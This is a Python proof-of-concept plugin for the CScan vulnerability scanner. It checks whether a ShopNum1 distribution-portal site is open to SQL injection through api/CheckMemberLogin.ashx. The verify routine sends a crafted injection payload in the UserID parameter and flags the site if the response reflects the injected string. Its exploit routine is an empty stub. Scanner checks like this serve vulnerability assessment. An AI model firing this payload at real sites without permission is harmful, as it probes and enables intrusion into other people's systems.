# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    poc_id = 'b35888d2-ecbf-4a71-bc3e-60d9e7022e19'
    name = 'ShopNum1分销门户系统 api/CheckMemberLogin.ashx注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-01-24'  # 漏洞公布时间
    desc = '''
        ShopNum1分销门户系统 api/CheckMemberLogin.ashx注入。
    '''  # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0146994'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'ShopNum1'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e575d304-c0d6-4416-b405-ad389e2ea7dd'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
        
            arg = '{target}'.format(target=self.target)
            payload = "/api/CheckMemberLogin.ashx?UserID=0'%20and%20(CHAR(116)%2bCHAR(101)%2bCHAR(115)%2bCHAR(116))>0--&type=UserIsExist"
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and "test" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
